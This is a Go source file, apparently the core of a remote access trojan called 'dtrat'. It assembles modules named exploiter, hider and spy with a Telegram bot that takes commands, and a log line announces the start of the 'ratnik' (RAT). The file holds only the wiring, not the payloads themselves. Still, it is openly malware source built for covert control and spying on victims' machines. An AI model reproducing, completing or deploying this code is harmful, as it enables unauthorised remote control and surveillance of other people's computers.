package rat

import (
	"dtrat/bot"
	"dtrat/config"
	"dtrat/engine"
	"dtrat/exploiter"
	"dtrat/hider"
	"dtrat/spy"
	"errors"
	"fmt"

	"github.com/deuterium34/dlog"
)

type Rat struct {
	Bot       *bot.Tgbot
	Engine    *engine.Engine
	Exploiter *exploiter.Exploiter
	Hider     *hider.Hider
	Spy       *spy.Spy

	Config  config.Config
	CloseCh chan (error)
}

var (
	ErrClosed = errors.New("Closed")
)

func NewRat() (*Rat, error) {
	cfg, err := config.NewConfig("config.toml")
	if err != nil {
		return nil, fmt.Errorf("NewConfig: %w", err)
	}

	bot, err := bot.NewBot(cfg)
	if err != nil {
		return nil, fmt.Errorf("NewBot: %w", err)
	}

	eng, err := engine.NewEngine(cfg)
	if err != nil {
		return nil, fmt.Errorf("NewEngine: %w", err)
	}

	exp, err := exploiter.NewExploiter()
	if err != nil {
		return nil, fmt.Errorf("NewExploiter: %w", err)
	}

	hdr, err := hider.NewHider()
	if err != nil {
		return nil, fmt.Errorf("NewHider: %w", err)
	}

	spy, err := spy.NewSpy()
	if err != nil {
		return nil, fmt.Errorf("NewSpy: %w", err)
	}

	rat := Rat{
		Bot:       bot,
		Engine:    eng,
		Exploiter: exp,
		Hider:     hdr,
		Spy:       spy,
		Config:    cfg,
		CloseCh:   make(chan error, 1),
	}

	return &rat, nil
}

func (r *Rat) internalClose(reason error) {
	r.Bot.Close()
	r.Engine.Close()
	r.Spy.Close()

	r.CloseCh <- reason
}

func (r *Rat) Close() {
	r.internalClose(ErrClosed)
}

func (r *Rat) Start() {
	dlog.GLogger.Info("Запуск ратника")
	go r.Bot.CommandsHandligLoop(r.Engine)
	go r.Bot.WakeNotification()
}
